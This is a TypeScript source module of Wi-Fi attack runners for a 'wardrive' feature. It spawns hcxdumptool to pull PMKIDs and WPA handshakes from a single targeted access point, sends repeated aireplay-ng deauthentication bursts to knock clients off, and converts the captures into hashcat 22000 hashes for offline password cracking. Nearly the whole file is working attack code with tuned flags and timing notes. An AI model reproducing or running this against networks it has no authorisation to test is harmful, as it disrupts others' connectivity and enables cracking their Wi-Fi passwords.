import { spawn, execFile, ChildProcess } from "child_process";
import { promisify } from "util";
import { EventEmitter } from "events";
import fs from "fs";
import path from "path";
import { ringFiles } from "./capture";

const execFileAsync = promisify(execFile);

// Attack runners for the wardrive module (driving capture, docs/wardrive.md).
//
// PMKID FIRST: hcxdumptool pointed at ONE AP (compiled BPF) asks the AP
// directly for its PMKID (RSN IE) — works with zero connected clients, no
// deauth noise. hcxdumptool manages its own monitor mode, channel lock and
// virtual MAC; do NOT pre-lock the channel with iw (hcxdumptool refuses to
// start on an iface someone else already put in monitor mode) and do NOT
// run it in parallel with the continuous dumpcap|tshark discovery pipeline
// (same iface): the service pauses the discovery capture while the PMKID
// round runs, then restarts it.
//
// extractEapolToSession() is the ONLY way an EAPOL/PMKID sighting becomes
// an artifact: hcxpcapngtool runs over the captured pcapng, writes the
// .hc22000 hash and reports whether real material was present. A "hit"
// without material never marks the network captured.
//
// DeauthOpRunner stays as the SECONDARY mechanism for APs that ignore the
// PMKID request — short directed bursts, rounds repeat while in range.

const BURST_DEFAULT = 16; // small burst per round; rounds repeat while in range

export async function extractEapolToSession(
  bssid: string,
  ringDir: string,
  sessionDir: string,
): Promise<{ ok: boolean; capFile: string; hashFile: string; eapolPairs: number }> {
  const prefix = bssid.replace(/:/g, "").toLowerCase();
  const destCap = path.join(sessionDir, `${prefix}.cap`);
  const destHash = path.join(sessionDir, `${prefix}.hc22000`);
  const tmpHash = `${destHash}.tmp`;
  const files = ringFiles(ringDir);
  let best = 0;
  let bestSrc: string | null = null;
  for (const f of files.reverse()) {
    // Newest first: the frames we just caused are in the freshest file.
    try {
      const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", tmpHash, f], {
        timeout: 30_000,
      });
      const text = `${stdout}\n${stderr}`;
      const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
      const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
      if (written > best) {
        best = written;
        bestSrc = f;
      }
    } catch {
      // Ring file may have rotated away mid-run — try the next one.
    }
  }
  try {
    fs.unlinkSync(tmpHash);
  } catch {
    // nothing written
  }
  if (best === 0 || !bestSrc) return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  try {
    fs.copyFileSync(bestSrc, destCap);
    const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", destHash, bestSrc], {
      timeout: 30_000,
    });
    const text = `${stdout}\n${stderr}`;
    const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
    const written = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
    const hashOk = written > 0 && fs.existsSync(destHash) && fs.statSync(destHash).size > 0;
    return {
      ok: hashOk,
      capFile: hashOk ? path.basename(destCap) : "",
      hashFile: hashOk ? path.basename(destHash) : "",
      eapolPairs: written,
    };
  } catch {
    return { ok: false, capFile: "", hashFile: "", eapolPairs: 0 };
  }
}

// Convert ONE capture file (hcxdumptool .pcapng or airodump .cap) to the
// hashcat -m 22000 hash. Returns the number of EAPOL/PMKID pairs hcx found.
export async function convertCaptureToHash(
  pcapngPath: string,
  hashPath: string,
): Promise<{ ok: boolean; eapolPairs: number; pmkidCount: number }> {
  try {
    const { stdout, stderr } = await execFileAsync("hcxpcapngtool", ["-o", hashPath, pcapngPath], {
      timeout: 30_000,
    });
    const text = `${stdout}\n${stderr}`;
    const eapolMatch = /EAPOL pairs written to .+?:\s*(\d+)/i.exec(text);
    const eapolPairs = eapolMatch ? parseInt(eapolMatch[1], 10) : 0;
    const pmkidMatch = /PMKID written to .+?:\s*(\d+)/i.exec(text);
    const pmkidCount = pmkidMatch ? parseInt(pmkidMatch[1], 10) : 0;
    const ok = (eapolPairs > 0 || pmkidCount > 0) && fs.existsSync(hashPath) && fs.statSync(hashPath).size > 0;
    return { ok, eapolPairs, pmkidCount };
  } catch {
    return { ok: false, eapolPairs: 0, pmkidCount: 0 };
  }
}

// ─── hcxdumptool BPF (single-AP targeting) ───────────────────────────────────
// hcxdumptool 6.3.5 dropped --filterlist_ap; targeting is done with a BPF
// compiled by hcxdumptool's own --bpfc (no tcpdump needed). addr3 = BSSID
// on management frames, addr4 covers the WDS corner case.
export async function compileBpfForAp(bssid: string): Promise<string | null> {
  const mac = bssid.toLowerCase().replace(/:/g, "");
  try {
    const { stdout } = await execFileAsync("hcxdumptool", [
      "--bpfc",
      `wlan addr3 ${mac} || wlan addr4 ${mac}`,
    ]);
    const bpf = stdout.trim();
    return bpf.length > 0 ? bpf : null;
  } catch {
    return null;
  }
}

// ─── PMKID runner (primary capture mechanism) ────────────────────────────────

export class PmkidDriveRunner extends EventEmitter {
  private proc: ChildProcess | null = null;
  private running = false;
  private buffer = "";

  constructor(
    private iface: string,
    private bssid: string,
    private pcapngPath: string,
    private channel: number,
    private windowMs: number,
    private bpfFile: string,
  ) {
    super();
  }

  // hcxdumptool 6.3.5 flags used here:
  //   -i iface       : manages its own monitor mode + channel + virtual MAC
  //   -w file        : pcapng with the RSN IE PMKID request/response frames
  //   -c <N>a        : lock to the target channel ("a" = 2GHz band suffix)
  //   --bpf=<file>   : only this AP's frames (writeBpfForAp wrote it)
  //   --attemptapmax : keep requesting the PMKID for the whole window
  //                    (default 4 BEACONs ≈ 2s is way too short — the AP
  //                    needs several beacons before it answers the RSN IE
  //                    PMKID request; verified on the device: 25s windows
  //                    produced 11-frame dumps with the default)
  //   --tot=<min>    : hard exit timer (ceil of the window, min 1 minute)
  //   --errormax=200 : tolerate malformed frames on a busy channel
  //   --rds=1        : status lines to stderr (parsed for [PMKID...] hits)
  start(): void {
    this.launch(true);
  }

  // Deauth-enabled variant: the SAME single-AP window, but WITHOUT
  // --exitoneapol (so it keeps capturing the full 4-way after the client
  // reconnects) — hcxdumptool's built-in directed deauths do the forcing.
  startWithDeauth(): void {
    this.launch(false);
  }

  private launch(exitOnEapol: boolean): void {
    if (this.running) return;
    this.running = true;
    const args = [
      "sudo", "-n", "hcxdumptool",
      "-i", this.iface,
      "-w", this.pcapngPath,
      "-c", `${this.channel}a`,
      "--bpf", this.bpfFile,
      "--attemptapmax", "0", // keep attacking this AP for the whole window
    ];
    if (exitOnEapol) args.push("--exitoneapol", "3");
    args.push(
      "--tot", String(Math.max(1, Math.ceil(this.windowMs / 60_000))),
      "--errormax", "200",
      "--rds=1",
    );
    this.proc = spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "pipe"] });
    this.proc.stderr?.on("data", (chunk: Buffer) => this.onStderr(chunk));
    this.proc.on("exit", (code, signal) => {
      const stillRunning = this.running;
      this.running = false;
      this.emit("exit", { code, signal, intentional: !stillRunning });
    });
    this.proc.on("error", (err) => {
      if (!this.running) return;
      this.running = false;
      this.emit("exit", { code: -1, signal: null, intentional: false, error: err?.message });
    });
  }

  private onStderr(chunk: Buffer): void {
    this.buffer += chunk.toString("utf8");
    let nl: number;
    while ((nl = this.buffer.indexOf("\n")) >= 0) {
      const line = this.buffer.slice(0, nl).trim();
      this.buffer = this.buffer.slice(nl + 1);
      if (!line) continue;
      // RDS confirmation markers: [PMKID:...] on a successful PMKID request,
      // EAPOL M1M2M3 lines for a full handshake.
      if (/\[PMKID/.test(line) || /M1M2M3|M2M3/i.test(line)) {
        this.emit("hit", { line });
      }
    }
  }

  stop(): void {
    this.running = false;
    killGroup(this.proc);
    this.proc = null;
  }

  isRunning(): boolean {
    return this.running;
  }
}

// Compile the BPF to a temp file BEFORE constructing the runner (the runner
// only reads it at spawn). Returns the file path, or null when hcxdumptool's
// compiler failed (caller skips PMKID for that round).
export async function writeBpfForAp(bssid: string, bpfFile: string): Promise<string | null> {
  const bpf = await compileBpfForAp(bssid);
  if (!bpf) return null;
  try {
    fs.writeFileSync(bpfFile, bpf + "\n");
    return bpfFile;
  } catch {
    return null;
  }
}

export class DeauthOpRunner {
  private proc: ChildProcess | null = null;
  private running = false;

  constructor(
    private iface: string,
    private bssid: string,
    private clientMac: string | null,
    private count: number = BURST_DEFAULT,
  ) {}

  start(): void {
    if (this.running) return;
    this.running = true;
    const args = ["sudo", "-n", "aireplay-ng", "--deauth", String(this.count), "-a", this.bssid];
    if (this.clientMac) args.push("-c", this.clientMac);
    args.push("-D", this.iface);
    this.proc = spawnDetached(args);
  }

  stop(): void {
    this.running = false;
    killGroup(this.proc);
    this.proc = null;
  }

  isRunning(): boolean {
    return this.running;
  }
}

// Minimal detached spawn + group kill (full versions in wifi-audit/attack.ts
// and wifiradar/capture.ts carry more guards; this one covers the same ESRCH
// races those comments document).
function spawnDetached(args: string[]): ChildProcess {
  return spawn(args[0], args.slice(1), { detached: true, stdio: ["ignore", "ignore", "ignore"] });
}

function killGroup(proc: ChildProcess | null): void {
  if (!proc?.pid) return;
  try {
    process.kill(-proc.pid, "SIGTERM");
  } catch {
    try {
      proc.kill("SIGTERM");
    } catch {
      // Already gone.
    }
  }
}